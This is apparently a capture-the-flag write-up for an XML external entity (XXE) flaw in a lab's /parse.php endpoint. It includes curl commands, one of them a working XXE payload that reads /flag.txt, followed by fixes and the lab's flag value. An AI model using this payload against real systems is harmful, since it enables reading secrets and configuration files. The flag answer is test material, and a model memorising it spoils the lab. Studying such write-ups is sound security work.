# XML Uploader XXE Flag Read

## What Is Happening

The XML Uploader lab accepts user-supplied XML through `/parse.php`, extracts `title` and `body`, and returns them as JSON. The lab description says the parser keeps legacy XML features for old partner integrations.

That legacy behavior allows external entities, so a crafted DOCTYPE can read local files such as `/flag.txt` and reflect the contents in the parsed output.

## Why It Happens

The server-side XML parser resolves DTD external entities from attacker-controlled input. When the entity is declared with a `file://` URI and referenced inside a reflected element, the file contents become part of the parsed document and are returned to the client.

The frontend only HTML-escapes values for display, but the disclosure already happened in the JSON response from `/parse.php`.

## Exact Test

Baseline parse:

```bash
curl -sS -X POST "https://d5559c91463d.pwnbox-lab.com/parse.php" \
  -H "Content-Type: application/json" \
  -d '{"xml":"<doc><title>Hello</title><body>Test</body></doc>"}'
```

XXE file read:

```bash
curl -sS -X POST "https://d5559c91463d.pwnbox-lab.com/parse.php" \
  -H "Content-Type: application/json" \
  -d '{"xml":"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE doc [\n  <!ENTITY xxe SYSTEM \"file:///flag.txt\">\n]>\n<doc>\n  <title>&xxe;</title>\n  <body>test</body>\n</doc>"}'
```

## Expected Signal

- Normal XML returns `{"ok":true,"document":{...}}`.
- XXE payload still returns `ok: true`.
- `document.title` contains the contents of `/flag.txt` instead of literal entity markup.

## Result Interpretation

Confirmed bug chain:

```text
User-controlled XML
-> external entity resolution enabled
-> file:///flag.txt read during parse
-> expanded entity reflected in JSON output
```

## Root Cause

XXE caused by unsafe legacy XML parsing with external entity support on untrusted input.

## Impact

- Local file read on the application host.
- Potential disclosure of secrets, configs, source, or keys depending on file permissions.
- In other environments, the same primitive can enable SSRF or blind out-of-band exfiltration.

## Fix

- Disable external entity resolution in the parser.
- Reject DOCTYPE declarations for untrusted XML.
- Prefer safer formats or schema-validated parsing without DTD processing.
- Add regression tests proving `file://`, `http://`, and parameter-entity payloads fail.

## Key Lesson

When a target mentions legacy XML compatibility, test inline external entities in reflected fields before attempting blind or out-of-band chains.

## Flag

`pwnbox{79ab3f7818e8b873f9f5bb5943b2cb56}`
